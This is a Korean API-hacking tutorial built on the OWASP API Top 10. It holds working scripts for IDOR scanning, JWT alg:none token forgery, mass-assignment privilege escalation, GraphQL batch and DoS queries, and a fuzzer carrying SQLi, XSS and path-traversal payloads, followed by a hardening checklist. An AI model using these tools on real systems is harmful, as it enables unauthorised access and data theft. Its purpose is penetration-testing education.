# API 해킹 완전 가이드

## API 보안 위협 지형도

```
OWASP API Security Top 10 (2019) — 최초 API 전용 Top 10

API1  Broken Object Level Authorization (BOLA/IDOR)
        → 가장 많이 발생하는 API 취약점. 객체 ID 조작으로 타 사용자 데이터 접근
        → Exploitability: 3, Prevalence: 3, Detectability: 2
API2  Broken Authentication
        → 자격증명 스터핑, 브루트포스, 약한 JWT, 취약한 비밀번호 재설정
        → 인증 엔드포인트는 일반 엔드포인트보다 추가 보호 레이어 필요
API3  Excessive Data Exposure
        → 클라이언트가 필터링할 것을 믿고 모든 객체 속성을 노출
        → 응답에 불필요한 민감 필드 포함
API4  Lack of Resources & Rate Limiting
        → 요청 크기/수 제한 없음 → DoS, 브루트포스 공격 가능
        → SMS 인증코드 6자리를 제한 없이 시도 가능한 시나리오
API5  Broken Function Level Authorization
        → 관리자 기능을 일반 사용자가 접근 가능
        → 복잡한 역할/그룹/계층 구조로 인한 권한 혼동
API6  Mass Assignment
        → 클라이언트 제공 데이터를 화이트리스트 없이 데이터 모델에 바인딩
        → role, is_admin, balance 등 민감 필드 임의 변경
API7  Security Misconfiguration
        → 불안전한 기본 설정, 불완전한 설정, 과도한 CORS, 상세 오류 메시지
API8  Injection
        → SQL, NoSQL, Command Injection — API 파라미터를 통한 인젝션
API9  Improper Assets Management
        → 구버전 API, 비공개 엔드포인트, 디버그 엔드포인트 노출
        → API 인벤토리 미관리 → 레거시 버전 공격 가능
API10 Insufficient Logging & Monitoring
        → 침해 탐지 평균 200일 소요
        → API 요청 로깅 부재 → 공격 추적/대응 불가
```

### API2 — Broken Authentication 상세 공격 시나리오
```
시나리오 1: 자격증명 스터핑 (Credential Stuffing)
  - 유출된 username/password 목록으로 API 로그인 대량 시도
  - Rate Limiting, CAPTCHA, 계정 잠금 미설정 시 성공

시나리오 2: SMS OTP 브루트포스
  POST /api/system/verification-codes (SMS 발송 요청)
  → 6자리 코드 = 1,000,000 가지 경우
  → Rate Limiting 없으면 멀티스레드로 수 분 내 전수 탐색

시나리오 3: 약한 JWT 토큰
  - alg: none → 서명 없는 토큰 허용
  - 약한 HS256 비밀키 → hashcat으로 오프라인 크랙
  - 만료일(exp) 미검증 → 영구 토큰

대응책:
  - 인증 엔드포인트 Rate Limiting (5회/분)
  - CAPTCHA / account lockout
  - MFA (Multi-Factor Authentication) 적용
  - JWT: 강한 비밀키(256bit), 짧은 만료, 알고리즘 고정
  - OAuth 2.0 + PKCE 표준 준수
```

### API9 — Improper Assets Management 탐지
```bash
# 구버전 API 엔드포인트 탐지
# /v1/, /v2/, /api/v1/, /api/v2/ 등 버전별 접근 시도
ffuf -u https://api.target.com/FUZZ/users \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Swagger/OpenAPI 문서 발견
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.yaml
curl https://api.target.com/docs
curl https://api.target.com/v1/swagger-ui

# 디버그/내부 엔드포인트 탐지
nuclei -u https://api.target.com -tags debug,exposure,api

# 과거 API 엔드포인트 (Wayback Machine)
echo "api.target.com" | waybackurls | grep "/api/" | sort -u
```

---

## 1. API 정찰

### API 엔드포인트 발견

```bash
# JS 파일에서 API 엔드포인트 추출
# 브라우저에서 JS 파일 URL 수집 후:
cat js_files.txt | while read url; do
    curl -s "$url" | grep -oE "(https?://[^\"']+|/api/[^\"' ]+)" | sort -u
done >> api_endpoints.txt

# LinkFinder로 JS 분석
python3 linkfinder.py -i https://target.com -d -o endpoints.html

# JSFinder
python3 JSFinder.py -u https://target.com -d

# Wayback Machine에서 과거 API 엔드포인트
echo "target.com" | waybackurls | grep "/api/" | sort -u

# gau로 API 경로 수집
gau target.com | grep -i "api\|v1\|v2\|v3\|graphql\|rest\|swagger"

# Swagger/OpenAPI 발견
ffuf -u https://target.com/FUZZ -w api_paths.txt -fc 404
# 일반적인 경로:
# /swagger, /swagger-ui, /swagger.json, /api-docs
# /openapi.json, /v1/swagger, /docs, /redoc
```

### API 문서 분석

```bash
# Swagger UI에서 API 목록 추출
curl -s https://target.com/swagger.json | \
    python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
"

# Postman 컬렉션 생성
curl -s https://target.com/swagger.json > swagger.json
swagger-codegen generate -i swagger.json -l html2 -o docs/

# OpenAPI 3.0 파싱
python3 -c "
import yaml, sys
with open('openapi.yaml') as f:
    spec = yaml.safe_load(f)
for path in spec.get('paths', {}).keys():
    print(path)
"
```

---

## 2. BOLA/IDOR (API1)

### BOLA 탐지 및 익스플로잇

```bash
# 기본 IDOR 테스트
# 계정 A의 토큰으로 계정 B의 리소스 접근

# 계정 A로 로그인
TOKEN_A="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 계정 B의 user_id 발견
USER_B_ID="12345"

# A의 토큰으로 B의 데이터 요청
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/v1/users/$USER_B_ID/profile

# 숫자 ID 시퀀스 브루트포스
for id in $(seq 1 1000); do
    response=$(curl -s -w "%{http_code}" \
                    -H "Authorization: Bearer $TOKEN_A" \
                    https://api.target.com/v1/orders/$id)
    
    if echo "$response" | grep -q "200"; then
        echo "[+] 접근 가능: order_id=$id"
        echo "$response" | python3 -m json.tool
    fi
done

# UUID/GUID IDOR
# 랜덤해 보이지만 예측 가능한 경우
# V1 UUID: 타임스탬프 기반 → 시간대 근처 UUID 탐색
python3 uuid_brute.py --start-time "2024-01-01" --end-time "2024-01-02"
```

### 간접 객체 참조 변환

```python
#!/usr/bin/env python3
"""API IDOR 자동 탐지"""

import requests
import json
from concurrent.futures import ThreadPoolExecutor

class IDORScanner:
    def __init__(self, base_url: str, token_a: str, token_b: str):
        self.base_url = base_url
        self.headers_a = {"Authorization": f"Bearer {token_a}"}
        self.headers_b = {"Authorization": f"Bearer {token_b}"}
    
    def get_user_b_resources(self) -> list:
        """계정 B로 리소스 목록 획득"""
        resources = []
        
        # 계정 B의 주문 목록
        resp = requests.get(
            f"{self.base_url}/v1/orders",
            headers=self.headers_b
        )
        if resp.status_code == 200:
            for order in resp.json():
                resources.append(('orders', order.get('id')))
        
        return resources
    
    def test_idor(self, resource_type: str, resource_id: str) -> bool:
        """계정 A로 계정 B의 리소스 접근 시도"""
        resp = requests.get(
            f"{self.base_url}/v1/{resource_type}/{resource_id}",
            headers=self.headers_a
        )
        
        if resp.status_code == 200:
            data = resp.json()
            print(f"[!] IDOR 발견: GET /{resource_type}/{resource_id}")
            print(f"    데이터: {json.dumps(data, indent=2)[:200]}")
            return True
        
        return False
    
    def scan(self):
        resources = self.get_user_b_resources()
        print(f"[*] 테스트 대상 {len(resources)}개 리소스")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(self.test_idor, rtype, rid)
                for rtype, rid in resources
            ]
```

---

## 3. Broken Authentication (API2)

### JWT 공격

```python
import requests
import json
import base64

def test_jwt_attacks(api_url: str, valid_token: str):
    """JWT 다양한 공격 자동 테스트"""
    
    attacks = {}
    
    # 1. alg:none 공격
    parts = valid_token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 페이로드 수정
    payload['role'] = 'admin'
    payload['admin'] = True
    
    header['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    none_token = f"{new_header.decode()}.{new_payload.decode()}."
    attacks['alg_none'] = none_token
    
    # 2. 빈 서명
    attacks['empty_sig'] = f"{parts[0]}.{parts[1]}."
    
    for attack_name, token in attacks.items():
        resp = requests.get(
            f"{api_url}/admin",
            headers={"Authorization": f"Bearer {token}"}
        )
        if resp.status_code != 401:
            print(f"[!] {attack_name} 공격 성공! Status: {resp.status_code}")
```

### API Key 브루트포스

```python
def test_api_key_entropy(api_url: str, sample_keys: list):
    """API 키 엔트로피 분석 및 패턴 발견"""
    import math
    import re
    
    for key in sample_keys:
        # 엔트로피 계산
        char_freq = {}
        for c in key:
            char_freq[c] = char_freq.get(c, 0) + 1
        
        entropy = -sum((f/len(key)) * math.log2(f/len(key)) 
                      for f in char_freq.values())
        
        print(f"키: {key[:10]}... 엔트로피: {entropy:.2f}")
        
        if entropy < 3.0:
            print(f"[!] 낮은 엔트로피 - 패턴 존재 가능")
        
        # 타임스탬프 패턴 확인
        if re.match(r'^[0-9a-f]{8}-', key):
            print(f"[!] UUID v1 패턴 - 타임스탬프 예측 가능")
```

---

## 4. Mass Assignment / Object Property (API3)

```python
# 취약한 API: 모든 필드 자동 바인딩
# PUT /api/users/me
{
    "name": "John",
    "email": "john@example.com",
    "role": "admin",       # ← 공격자 추가
    "is_admin": true,      # ← 공격자 추가
    "balance": 99999       # ← 공격자 추가
}

# 테스트: 추가 필드 전송
def test_mass_assignment(api_url: str, token: str):
    
    # 공격 페이로드 목록
    payloads = [
        {"role": "admin"},
        {"is_admin": True, "admin": 1},
        {"privilege": "admin"},
        {"user_type": "administrator"},
        {"permissions": ["read", "write", "admin"]},
        {"balance": 99999999},
        {"credit": 1000000},
        {"verified": True},
        {"email_verified": True},
        {"account_type": "premium"},
    ]
    
    # 현재 상태 확인
    before = requests.get(
        f"{api_url}/me",
        headers={"Authorization": f"Bearer {token}"}
    ).json()
    
    for payload in payloads:
        resp = requests.put(
            f"{api_url}/me",
            json=payload,
            headers={"Authorization": f"Bearer {token}",
                     "Content-Type": "application/json"}
        )
        
        after = requests.get(
            f"{api_url}/me",
            headers={"Authorization": f"Bearer {token}"}
        ).json()
        
        # 변경된 필드 확인
        for key, value in payload.items():
            if after.get(key) == value and before.get(key) != value:
                print(f"[!] Mass Assignment 취약점! 필드 변경: {key}={value}")
```

---

## 5. GraphQL 보안 테스트

```bash
# GraphQL 인트로스펙션 (스키마 추출)
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"}'

# GraphQL 침투 테스트 도구
pip install graphw00f gql

# graphw00f - GraphQL 엔진 지문 수집
python3 main.py -d https://target.com/graphql

# InQL - Burp Suite 플러그인
# 자동 스키마 분석 및 쿼리 생성

# 배치 공격 (Rate Limit 우회)
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '[
        {"query":"{user(id:1){email}}"},
        {"query":"{user(id:2){email}}"},
        {"query":"{user(id:3){email}}"},
        ...100개...
    ]'

# GraphQL 인젝션
{
  "query": "{ user(id: \"1\") { email } }"
}
# id 필드에 인젝션:
{
  "query": "{ user(id: \"1 OR 1=1\") { email } }"
}

# 깊은 재귀 쿼리 (DoS)
{
  user {
    friends {
      friends {
        friends {  # 깊이 제한 없으면 서버 과부하
          name
        }
      }
    }
  }
}
```

---

## 6. REST API 퍼징

```python
#!/usr/bin/env python3
"""REST API 자동 퍼저"""

import requests
import json
import random
import string
from typing import Any

class APIFuzzer:
    def __init__(self, base_url: str, auth_header: dict = None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_header:
            self.session.headers.update(auth_header)
        
        self.findings = []
    
    def fuzz_string(self) -> list:
        """문자열 퍼징 페이로드"""
        return [
            "",                           # 빈 값
            " ",                          # 공백
            "null",                       # null 문자열
            "true",                       # 불리언 문자열
            "0",                          # 숫자 문자열
            "' OR '1'='1",               # SQLi
            "'; DROP TABLE users--",      # SQLi
            "<script>alert(1)</script>",  # XSS
            "{{7*7}}",                    # SSTI
            "${7*7}",                     # EL 인젝션
            "../../../etc/passwd",        # Path traversal
            "A" * 10000,                  # 버퍼 오버플로우
            "\x00",                       # Null byte
            "admin",                      # 특수 값
            "\n\r",                       # CRLF
        ]
    
    def fuzz_endpoint(self, endpoint: str, method: str = 'GET',
                      params: dict = None):
        """엔드포인트 퍼징"""
        
        if not params:
            # 간단한 파라미터 발견
            for fuzz_param in ['id', 'user_id', 'name', 'search', 'q']:
                for payload in self.fuzz_string():
                    url = f"{self.base_url}{endpoint}"
                    
                    try:
                        if method == 'GET':
                            resp = self.session.get(
                                url, 
                                params={fuzz_param: payload},
                                timeout=10
                            )
                        else:
                            resp = self.session.post(
                                url,
                                json={fuzz_param: payload},
                                timeout=10
                            )
                        
                        self._analyze_response(
                            resp, endpoint, fuzz_param, payload
                        )
                    except Exception as e:
                        pass
    
    def _analyze_response(self, resp: requests.Response, 
                          endpoint: str, param: str, payload: str):
        """응답 분석으로 취약점 탐지"""
        
        # SQL 오류
        sql_errors = ['syntax error', 'mysql_fetch', 'ORA-', 
                      'sqlite', 'sql server', 'pg_query']
        for err in sql_errors:
            if err.lower() in resp.text.lower():
                self.findings.append({
                    'type': 'SQL Injection',
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'status': resp.status_code
                })
                print(f"[!] 잠재적 SQLi: {endpoint}?{param}={payload}")
        
        # XSS 반사
        if payload in resp.text and '<script>' in payload.lower():
            self.findings.append({
                'type': 'Reflected XSS',
                'endpoint': endpoint,
                'parameter': param
            })
        
        # 오류 노출
        if resp.status_code == 500:
            print(f"[!] 서버 오류: {endpoint} ({param}={payload[:20]})")
        
        # 응답 시간 기반 탐지 (Time-based)
        if resp.elapsed.total_seconds() > 5:
            print(f"[!] 느린 응답 ({resp.elapsed.total_seconds():.1f}s): {endpoint}")
    
    def generate_report(self):
        print(f"\n=== API 퍼징 결과 ({len(self.findings)}개 발견) ===")
        for finding in self.findings:
            print(f"\n[{finding['type']}]")
            print(f"  엔드포인트: {finding['endpoint']}")
            print(f"  파라미터: {finding.get('parameter', '-')}")
            print(f"  페이로드: {finding.get('payload', '-')[:50]}")
```

---

## 7. API 보안 강화 가이드

### 인증 및 권한

```python
# 안전한 API 키 생성
import secrets
api_key = secrets.token_urlsafe(32)  # 256비트 엔트로피

# JWT 안전한 설정
import jwt
from datetime import datetime, timedelta, timezone

def create_token(user_id: int, secret: str) -> str:
    payload = {
        'sub': str(user_id),
        'iat': datetime.now(timezone.utc),
        'exp': datetime.now(timezone.utc) + timedelta(hours=1),
        'jti': secrets.token_urlsafe(16),  # JWT ID (재사용 방지)
    }
    
    return jwt.encode(payload, secret, algorithm='HS256')

# Rate Limiting (Flask-Limiter)
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/login")
@limiter.limit("5 per minute")  # 로그인은 더 엄격하게
def login():
    pass
```

### API 보안 체크리스트

```
인증:
  □ 모든 엔드포인트 인증 필요
  □ API 키 고엔트로피 (32바이트 이상)
  □ JWT: HS256 이상, 비밀키 256비트 이상
  □ 짧은 토큰 만료 시간 (1시간 이하)
  □ Refresh Token 로테이션

권한:
  □ 객체 수준 권한 (BOLA 방지)
  □ 기능 수준 권한 (관리자 API 분리)
  □ 속성 수준 권한 (Mass Assignment 방지)

입력 검증:
  □ 모든 파라미터 유형 검증
  □ 화이트리스트 기반 필드 허용
  □ 최대 페이로드 크기 제한
  □ SQL 쿼리 파라미터 바인딩

Rate Limiting:
  □ IP별 요청 제한
  □ 사용자별 요청 제한
  □ 엔드포인트별 맞춤 제한

모니터링:
  □ 모든 API 요청 로깅
  □ 비정상 패턴 알림
  □ API 인벤토리 관리
  □ 지원 종료 버전 제거
```
